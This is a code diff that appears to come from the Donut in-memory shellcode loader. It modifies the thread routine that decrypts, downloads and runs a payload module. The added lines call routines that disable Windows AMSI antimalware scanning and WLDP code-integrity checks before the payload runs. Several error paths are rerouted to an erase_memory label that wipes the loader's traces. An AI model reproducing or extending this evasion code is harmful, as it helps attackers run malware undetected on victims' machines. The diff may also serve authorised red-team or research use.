@@ -41,6 +41,7 @@ DWORD ThreadProc(LPVOID lpParameter) {
     VirtualFree_t   _VirtualFree;
     LPVOID          pv;
     ULONG64         hash;
+    BOOL            disabled;
     
     DPRINT("Maru IV : %" PRIX64, inst->iv);
     
@@ -53,7 +54,7 @@ DWORD ThreadProc(LPVOID lpParameter) {
     _VirtualFree  = (VirtualFree_t) xGetProcAddress(inst, hash,  inst->iv);
     
     if(_VirtualAlloc == NULL || _VirtualFree == NULL) {
-      DPRINT("Failed.");
+      DPRINT("FAILED!.");
       return -1;
     }
     
@@ -92,7 +93,7 @@ DWORD ThreadProc(LPVOID lpParameter) {
     
     if(mac != inst->mac) {
       DPRINT("Decryption of instance failed");
-      return -1;
+      goto erase_memory;
     }
 #endif
     DPRINT("Resolving LoadLibraryA");
@@ -114,13 +115,13 @@ DWORD ThreadProc(LPVOID lpParameter) {
       
       if(inst->api.addr[i] == NULL) {
         DPRINT("Failed to resolve API");
-        return -1;
+        goto erase_memory;
       }
     }
     
     if(inst->type == DONUT_INSTANCE_URL) {
       DPRINT("Instance is URL");
-      if(!DownloadModule(inst)) return -1;
+      if(!DownloadModule(inst)) goto erase_memory;
     }
     
     if(inst->type == DONUT_INSTANCE_PIC) {
@@ -129,6 +130,21 @@ DWORD ThreadProc(LPVOID lpParameter) {
     } else {
       DPRINT("Loading module from allocated memory");
       mod = inst->module.p;
+    }
+    
+    // try bypassing AMSI and WLDP?
+    if(inst->bypass != DONUT_BYPASS_SKIP) {
+      // Try to disable AMSI
+      disabled = DisableAMSI(inst);
+      DPRINT("DisableAMSI %s", disabled ? "OK" : "FAILED");
+      if(!disabled && inst->bypass == DONUT_BYPASS_ABORT) 
+        goto erase_memory;
+      
+      // Try to disable WLDP
+      disabled = DisableWLDP(inst);
+      DPRINT("DisableWLDP %s", disabled ? "OK" : "FAILED");
+      if(!disabled && inst->bypass == DONUT_BYPASS_ABORT) 
+        goto erase_memory;
     }
     
     // unmanaged EXE/DLL?
@@ -156,6 +172,7 @@ DWORD ThreadProc(LPVOID lpParameter) {
       RunXSL(inst);
     }
     
+erase_memory:
     // if module was downloaded
     if(inst->type == DONUT_INSTANCE_URL) {
       if(inst->module.p != NULL) {
